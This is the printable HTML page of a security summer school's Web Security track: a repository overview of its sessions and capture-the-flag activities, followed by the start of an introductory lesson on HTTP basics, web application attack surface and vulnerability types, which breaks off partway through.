<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=generator content="Hugo 0.101.0"><link rel=canonical type=text/html href=/web/><link rel=alternate type=application/rss+xml href=/web/index.xml><meta name=robots content="noindex, nofollow"><link rel="shortcut icon" href=/favicons/favicon.ico><link rel=apple-touch-icon href=/favicons/apple-touch-icon-180x180.png sizes=180x180><link rel=icon type=image/png href=/favicons/favicon-16x16.png sizes=16x16><link rel=icon type=image/png href=/favicons/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/favicons/android-36x36.png sizes=36x36><link rel=icon type=image/png href=/favicons/android-48x48.png sizes=48x48><link rel=icon type=image/png href=/favicons/android-72x72.png sizes=72x72><link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96><link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144><link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192><title>Security Summer School</title><meta name=description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta property="og:title" content><meta property="og:description" content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta property="og:type" content="website"><meta property="og:url" content="/web/"><meta property="og:site_name" content="Security Summer School"><meta itemprop=name content><meta itemprop=description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="A free Security Summer School focused on security essentials, binary exploitation and web security."><link rel=preload href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css as=style><link href=/scss/main.min.5aef8a3f4159801f5dbe642e33f5332212e837eda91d37dcd891fdcd5c32498a.css rel=stylesheet integrity><script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-00000000-0","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=td-section><header><nav class="js-navbar-scroll navbar navbar-expand navbar-dark flex-column flex-md-row td-navbar"><a class=navbar-brand href=/><span class=navbar-logo><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 500 500" style="enable-background:new 0 0 500 500"><g><path style="fill:#fff" d="M116.8525 421.9722c-5.7041.0-10.3442-4.3127-10.3442-9.6129V88.183c0-5.3002 4.6401-9.6117 10.3442-9.6117H320.858c3.0347.0 9.3959.5498 11.7506 2.6302l.3545.3442 58.905 63.2912c2.3101 2.491 2.9202 8.4928 2.9202 11.3184v256.2039c0 5.3002-4.6407 9.6129-10.3436 9.6129H116.8525z"/><g><g><g><path style="fill:#767676" d="M384.4445 423.2066H116.852c-6.3839.0-11.5786-4.8658-11.5786-10.8474V88.1831c0-5.9804 5.1947-10.8461 11.5786-10.8461h204.0062c.377.0 9.2786.0329 12.568 2.9389l.3947.3833 58.9508 63.337c3.2135 3.4652 3.2514 11.7924 3.2514 12.1593v256.2036C396.0231 418.3408 390.8284 423.2066 384.4445 423.2066zM116.5079 411.9189c.0848.0278.1999.0531.3441.0531h267.5925c.1442.0.2581-.0253.3441-.0531V156.1556c-.0076-.9033-.3593-3.7347-.7034-5.0037l-57.6527-61.9416c-1.4651-.3176-4.4533-.6389-5.5742-.6389H116.852c-.143.0-.2594.024-.3441.0531V411.9189zm267.4533-261.149zM327.0321 89.371v.0013V89.371z"/></g></g></g><g><g><path style="fill:#5b7fc0" d="M189.0874 210.1754l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4473C177.5953 212.627 183.0601 210.1742 189.0874 210.1754zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 234.1722 197.0804 232.033z"/><path style="opacity:.3;fill:#fff" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/><g><defs><path id="SVGID_1_" d="M194.7376 237.6875c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 234.2399 196.1861 236.239 194.7376 237.6875z"/></defs><clipPath id="SVGID_2_"><use xlink:href="#SVGID_1_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_2_);fill:#fff" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/><path style="opacity:.13;clip-path:url(#SVGID_2_);fill:#020202" d="M190.0704 225.0237c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 225.7247 191.9774 225.0237 190.0704 225.0237z"/></g><g><defs><path id="SVGID_3_" d="M189.0898 210.176c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 212.6276 183.0612 210.176 189.0898 210.176zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 236.239 197.0839 234.2399 197.0839 232.0372z"/></defs><clipPath id="SVGID_4_"><use xlink:href="#SVGID_3_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_4_);fill:#5b7fc0" d="M172.6595 215.6045c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8475-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 209.1953 176.6171 211.647 172.6595 215.6045z"/></g></g><rect x="198.8952" y="225.1043" style="fill:#5b7fc0" width="122.6266" height="13.8671"/></g><g><path style="fill:#d95140" d="M189.0874 155.7611l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.0249 2.454-11.4897 6.4116-15.4473C177.5953 158.2128 183.0601 155.7599 189.0874 155.7611zm7.993 21.8577c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.2508 181.7667 197.0816 179.758 197.0804 177.6188z"/><path style="opacity:.3;fill:#fff" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/><g><defs><path id="SVGID_5_" d="M194.7376 183.2733c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 179.8256 196.1861 181.8248 194.7376 183.2733z"/></defs><clipPath id="SVGID_6_"><use xlink:href="#SVGID_5_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_6_);fill:#fff" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/><path style="opacity:.13;clip-path:url(#SVGID_6_);fill:#020202" d="M190.0704 170.6095c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9546.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.663-2.8588-6.116.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C193.7885 171.3104 191.9774 170.6095 190.0704 170.6095z"/></g><g><defs><path id="SVGID_7_" d="M189.0898 155.7617c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8066-21.8612-21.8613.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 158.2134 183.0612 155.7617 189.0898 155.7617zm7.9941 21.8613c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 181.8248 197.0839 179.8256 197.0839 177.623z"/></defs><clipPath id="SVGID_8_"><use xlink:href="#SVGID_7_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_8_);fill:#d95140" d="M172.6595 161.1903c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 154.7811 176.6171 157.2327 172.6595 161.1903z"/></g><rect x="198.8952" y="170.69" style="fill:#d95140" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#56a55c" d="M189.5379 264.6147l.0012-.0012c7.7751.0012 15.0294 4.1862 18.932 10.9235 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3304-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032-5.8394.0-11.3281-2.2733-15.458-6.4032-4.13-4.13-6.4032-9.6186-6.4056-15.4628.0012-6.0249 2.454-11.4897 6.4116-15.4472C178.0458 267.0663 183.5105 264.6135 189.5379 264.6147zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6538 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403C196.7013 290.6202 197.5321 288.6115 197.5309 286.4723z"/><path style="opacity:.3;fill:#fff" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/><g><defs><path id="SVGID_9_" d="M195.1881 292.1268c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.9989 7.9942-7.9941 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.5344 288.6792 196.6366 290.6783 195.1881 292.1268z"/></defs><clipPath id="SVGID_10_"><use xlink:href="#SVGID_9_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_10_);fill:#fff" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/><path style="opacity:.13;clip-path:url(#SVGID_10_);fill:#020202" d="M190.5209 279.463c-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7446-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9941 2.3802-1e-4 4.616 1.0833 6.1218 2.8788C194.239 280.164 192.4279 279.463 190.5209 279.463z"/></g><g><defs><path id="SVGID_11_" d="M189.5403 264.6153c7.7763.0 15.0283 4.1826 18.926 10.9151 1.9201 3.3135 2.9377 7.0987 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8613-12.0547.0024-21.8636-9.8065-21.8612-21.8613.0-6.0285 2.4516-11.492 6.4116-15.452C178.0482 267.0669 183.5117 264.6153 189.5403 264.6153zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9941.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.6366 290.6783 197.5344 288.6792 197.5344 286.4765z"/></defs><clipPath id="SVGID_12_"><use xlink:href="#SVGID_11_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_12_);fill:#56a55c" d="M173.11 270.0439c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8613 12.0547.0024 21.8636-9.797 21.8613-21.8613.0024-3.8474-1.0151-7.6326-2.9353-10.9462-3.8977-6.7325-11.1497-10.9151-18.926-10.9151C182.5311 263.6346 177.0676 266.0863 173.11 270.0439z"/></g></g><rect x="199.3456" y="279.5436" style="fill:#56a55c" width="122.6266" height="13.8671"/></g><g><g><path style="fill:#f1bc42" d="M189.0874 318.7208l.0012-.0012c7.7751.0012 15.0295 4.1862 18.932 10.9234 1.9177 3.3159 2.9305 7.1011 2.9293 10.9378.0 5.8394-2.2733 11.3305-6.4032 15.4604-4.1288 4.1288-9.6186 6.4032-15.458 6.4032s-11.328-2.2733-15.458-6.4032-6.4032-9.6186-6.4056-15.4628c.0012-6.025 2.454-11.4897 6.4116-15.4472C177.5953 321.1724 183.0601 318.7196 189.0874 318.7208zm7.993 21.8576c.0012-1.4042-.3687-2.7868-1.063-3.9887-1.4293-2.4684-4.0833-3.9995-6.9299-4.0019-4.4077.0024-7.993 3.5877-7.993 7.993.0 2.1356.832 4.1431 2.3427 5.6539 1.5083 1.5083 3.5159 2.3403 5.6503 2.3415 2.1356.0 4.1443-.8308 5.6539-2.3403S197.0816 342.7176 197.0804 340.5784z"/><path style="opacity:.3;fill:#fff" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/><g><defs><path id="SVGID_13_" d="M194.7376 346.2329c-1.4461 1.4461-3.4452 2.3439-5.6479 2.3439-4.4077-.0024-7.9918-3.5865-7.9942-7.9942.0024-4.4125 3.5937-7.999 7.9942-7.9942 2.8443.0 5.497 1.5323 6.924 3.9983.6991 1.2067 1.0702 2.5881 1.0702 3.9959C197.0839 342.7853 196.1861 344.7844 194.7376 346.2329z"/></defs><clipPath id="SVGID_14_"><use xlink:href="#SVGID_13_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_14_);fill:#fff" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/><path style="opacity:.13;clip-path:url(#SVGID_14_);fill:#020202" d="M190.0704 333.5691c-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0011 1.9547.7088 3.7452 1.8782 5.1354-1.7447-1.4674-2.8575-3.6631-2.8588-6.1161.0024-4.4125 3.5936-7.999 7.9942-7.9942 2.3802-1e-4 4.616 1.0834 6.1218 2.8788C193.7885 334.2701 191.9774 333.5691 190.0704 333.5691z"/></g><g><defs><path id="SVGID_15_" d="M189.0898 318.7214c7.7763.0 15.0283 4.1826 18.926 10.915 1.9201 3.3136 2.9377 7.0988 2.9353 10.9462.0024 12.0643-9.8065 21.8636-21.8613 21.8612-12.0547.0024-21.8636-9.8065-21.8612-21.8612.0-6.0285 2.4516-11.4921 6.4116-15.452C177.5977 321.173 183.0612 318.7214 189.0898 318.7214zm7.9941 21.8612c0-1.4078-.3711-2.7892-1.0702-3.9959-1.4269-2.466-4.0797-3.9983-6.924-3.9983-4.4005-.0048-7.9918 3.5817-7.9942 7.9942.0024 4.4077 3.5865 7.9918 7.9942 7.9942 2.2027.0 4.2018-.8978 5.6479-2.3439C196.1861 344.7844 197.0839 342.7853 197.0839 340.5826z"/></defs><clipPath id="SVGID_16_"><use xlink:href="#SVGID_15_" style="overflow:visible"/></clipPath><path style="clip-path:url(#SVGID_16_);fill:#f1bc42" d="M172.6595 324.15c-3.96 3.96-6.4116 9.4235-6.4116 15.452-.0024 12.0547 9.8066 21.8636 21.8613 21.8612 12.0547.0024 21.8636-9.797 21.8613-21.8612.0024-3.8474-1.0151-7.6327-2.9353-10.9462-3.8977-6.7324-11.1497-10.9151-18.926-10.9151C182.0806 317.7407 176.6171 320.1924 172.6595 324.15z"/></g></g><rect x="198.8952" y="333.6497" style="fill:#f1bc42" width="122.6266" height="13.8671"/></g></g></svg></span><span class=font-weight-bold>Security Summer School</span></a><div class="td-navbar-nav-scroll ml-md-auto" id=main_navbar><ul class="navbar-nav mt-2 mt-lg-0"><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/binary/><span>Binary Exploitation</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/essentials/><span>Security Essentials</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class="nav-link active" href=/web/><span class=active>Web Security</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/community/><span>Community</span></a></li><li class="nav-item mr-4 mb-2 mb-lg-0"><a class=nav-link href=/docs/><span>Documentation</span></a></li></ul></div><div class="navbar-nav d-none d-lg-block"><input type=search class="form-control td-search-input" placeholder="&#xf002; Search this site…" aria-label="Search this site…" autocomplete=off></div></nav></header><div class="container-fluid td-outer"><div class=td-main><div class="row flex-xl-nowrap"><main class="col-12 col-md-9 col-xl-8 pl-md-5" role=main><div class=td-content><div class="pageinfo pageinfo-primary d-print-none"><p>This is the multi-page printable view of this section.
<a href=# onclick="return print(),!1">Click here to print</a>.</p><p><a href=/web/>Return to the regular view of this page</a>.</p></div><h1 class=title></h1><ul><li>1: <a href=#pg-09fc36b6d03aacc7a5bf78018398472d></a></li><li>2: <a href=#pg-ad6229ac83952aee3cad201564d38029></a></li><li>3: <a href=#pg-1f60c8f1a3a525eb0a23908be44ee610></a></li><li>4: <a href=#pg-6d3ea5280422db131d38d303e9ab2bdd></a></li><li>5: <a href=#pg-e8a4b127c58a39d643c27e9bb530772d></a></li><li>6: <a href=#pg-fca1ee26cbdcd099d45b25d743b89e27></a></li><li>7: <a href=#pg-6f17608ea1025e0a5b816d1e00d823ad></a></li><li>8: <a href=#pg-cd5bf7687b4a925bb14ff76ea1daabd5></a></li><li>9: <a href=#pg-9487404c736db9fa8f9337d1c0a562ec></a></li><li>10: <a href=#pg-24fd7f1ab837908ca2f19a8c87b50121></a></li><li>11: <a href=#pg-03fe8cede4f5753ef901dba7c96bedd9></a></li><li>12: <a href=#pg-65ef646d6eed697a7af341ec1cc2f0ce></a></li></ul><div class=content><h1 id=sss-web-security>SSS Web Security</h1><p>This is the public repository for the <strong>Web Security</strong> track of the Security Summer School (SSS).
It contains information available to participants: session content, slides, activities support files.
Apart from SSS participants, you can use this content by yourself to learn more about <strong>Web Security</strong>.</p><h2 id=using-the-content>Using the Content</h2><p>As with all SSS tracks, the <strong>Web Security</strong> track consists of multiple sessions.
One session typically covers a particular topic of the track.
Ideally you would go through the sessions orderly, but you can jump ahead to a topic of interest.</p><p>Each session has its own folder.
The <code>index.md</code> file from a session folder details the topic of the session and includes practical demos of tools and snippets of code.</p><p>After reading the session contents, jump to the hands-on activities.
A typical activity will challenge you to solve / exploit a given issue and obtain a flag.
Read the activity description in the session contents and then use the activity support file to get to a solution.
Each activity will develop your practical skills and help you get a better understanding of the session topics.</p><p>Activities come in two forms:</p><ul><li><strong>tutorials</strong>: that provide a step-by-step detailing of the solution.</li><li><strong>challenges</strong>: that only state the goal and provide an initial skeleton (and maybe some hints), then the rest is up to you.
Even so, challenge activity folders store the reference solution for you to take a sneak peak in case you&rsquo;re lost.</li></ul><h2 id=support>Support</h2><p>In case you have questions or want to know more about a topic, use the the <code>Discussions</code> tab or join the <a href=https://discord.gg/qx3RmNEVkB>SSS Discord community</a>.</p><h3 id=session-folder-structure>Session Folder Structure</h3><p>A session folder consists of:</p><ul><li><code>index.md</code>: session contents, written in <a href=https://guides.github.com/features/mastering-markdown/>GitHub Markdown</a></li><li><code>activities/</code>: each activity has its own folder with support files (including the reference solution)</li><li><code>assets/</code>: support files for session contents (images, diagrams, code snippets, packet captures, etc.)</li><li><code>slides/</code>: session slides</li></ul><h3 id=activity-folder-structure>Activity Folder Structure</h3><p>An activity folder consists of:</p><ul><li><code>public/</code>: support file for the activity: binary files, helper scripts, packet captures etc.</li><li><code>sol/</code>: the reference solution of the activity.
Tutorial activities feature a <code>README.md</code> file in the solution folder, with a detailing of the solution.</li></ul><h2 id=contributing>Contributing</h2><p>Contributions are welcome.
See the <a href=CONTRIBUTING.md>contribution guide</a> on how you could report or fix issues and on how you can improve the content.</p><p>Reviewers are requested to follow the <a href=REVIEWING.md>reviewing guide</a>.</p><p>For in-depth discussions, please join the <a href=https://discord.gg/qx3RmNEVkB>SSS Discord community</a>.</p></div></div><div class=td-content style=page-break-before:always><h1 id=pg-09fc36b6d03aacc7a5bf78018398472d>1 -</h1><h1 id=introduction>Introduction</h1><hr><p>As the World Wide Web&rsquo;s high-level topology consists mainly of personal computing devices (e.g. desktops, laptops, mobile devices) making HTTP requests to web servers, the general field of web security consists of three main sub-fields: client-side security (i.e. browser security), communications security and server-side security, or web application security.
This lab and the following will focus on the first sub-field, although they might provide some general information on the former two.</p><p>The design of web applications, and their security in particular is influenced by the following characteristics:</p><ul><li><p><strong>Statelessness:</strong> by default HTTP is a simple request-response protocol maintaining no state between successive communications.
This shortcoming led to the design of cookies, which are small pieces of information exchanged between the client and the web application.
The type of information exchanged using cookies needs to be carefully chosen, as a malicious client could possibly attempt to send back a malformed or forged cookie; additionally, cookies most often (but not always) represent confidential data, which means that they should only be transferred over a secure channel (i.e. HTTPS).</p></li><li><p><strong>Message format:</strong> HTTP requests have a specific format, namely they comprise plain-text header and data (although newer improvements also implement a binary protocol).
The header contains various information about the client or the server (e.g. a user-agent, page caching information, text encoding information), while the payload is very often (but not always) an HTML page.</p></li><li><p><strong>Addressing:</strong> resources on the web are located using the URI/URL addressing scheme.
Possible vulnerabilities here include a misconfigured web server that allows viewing application-specific files, or worse, that allows accessing other files on the host machine.
While this information leakage is not very dangerous by itself, it may be used as an intermediary stage for other attacks.
You can read more about URLs here <a href=https://skorks.com/2010/05/what-every-developer-should-know-about-urls/>[1]</a>.</p></li><li><p><strong>Request methods:</strong> HTTP communication is done by using methods, also called HTTP verbs.
The most used methods are GET, POST, PUT and DELETE.
The GET method is read-only and is used to retrieve data from the server.
A DELETE request is used to remove the specified resource from the server.
The PUT method is used to modify an entire resource.
POST requests are used to create new resources.
You can find more information about all methods here <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods>[2]</a>.</p></li></ul><p>While the client is provided with HTML, JavaScript, CSS pages, modern web applications are implemented using general-purpose scripting or programming languages, e.g. PHP, Java, Python, Ruby, etc. and centralize their data using database systems such as MySQL.
Faulty back-end code can in itself provide a more dangerous attack surface to potentially malicious clients.</p><p><img src=./assets/Session_01_Web_Basics_Diagram_01.jpg alt="Client - Server"></p><h1 id=web-applications-today>Web Applications Today</h1><p>Dynamic websites provide tailored user experiences based on information known or given by the user.
The user usually has to authenticate to access the website and is authorized to use the services it provides.
In this case, the dynamic website contains information about the user, and there is therefore a great deal more for the attacker to steal.
The fundamental difference to static web pages is that a dynamic webpage/website contains functionality that can be compromised.
Breaching the security of the server itself is no longer necessary. It is sufficient to discover the security hole in the dynamic website functionality.
We, therefore, need to look at the security of a web application itself. A dynamic website can be considered to be a web application.</p><p>Web applications introduce a new range of threats, or a new security perimeter, to put it another way.
Depending on the setup, web applications are commonly located in an internal network or in the demilitarized zone, which therefore renders network level defenses ineffective.
Network, services and operating system level defenses may have been perfectly set in place, but the system would still be vulnerable to a break-in.
Web applications commonly interact with internal systems, such as database servers.
The network level firewall could be blocking all traffic, but for web applications, it will have to allow HTTP and HTTPS traffic.
An attacker might therefore be able to bypass all network-level defenses.</p><h1 id=types-of-vulnerabilities>Types of Vulnerabilities</h1><p>These days, web applications are very complex being composed of multiple libraries, frameworks and using multiple external services.
Each component can have vulnerabilities.
Types of vulnerabilities:</p><ul><li>System vulnerabilities - applications or services that run inside an Operating System or an Operating System vulnerability</li><li>Runtime vulnerabilities - when one of the components (frameworks such as PHP, Java, Python, WordPress, etc.) of the web application is vulnerable leads to a risk.</li><li>Browser vulnerabilities - occasionally attackers will discover a vulnerability in the browser itself that allows execution of arbitrary binary code when a user simply visits a compromised site.
